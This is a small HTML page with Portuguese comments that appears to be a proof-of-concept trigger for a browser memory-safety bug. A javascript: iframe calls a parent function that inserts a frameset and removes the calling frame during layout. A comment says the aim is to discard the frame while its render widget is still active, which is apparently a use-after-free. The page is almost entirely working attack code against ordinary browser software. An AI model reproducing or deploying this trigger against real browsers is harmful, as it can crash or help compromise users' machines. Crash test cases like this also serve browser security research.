
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<style>
  iframe {
    content: url();
    zoom: 0.01;
  }
</style>
</head>
<body>

<iframe id="i0" src="javascript:parent.triggerLayout()"></iframe>

<script>
  function triggerLayout() {
    // Quando o iframe executa este script, o RenderWidget está ativo
    document.documentElement.append(document.createElement('frameset'));
    
    // Força descarte imediato do próprio frame chamador
    const i0 = document.getElementById('i0');
    if (i0) {
      i0.src = 'about:blank';
      i0.remove();
      void document.documentElement.offsetHeight;
    }
  }
</script>
</body>
</html>
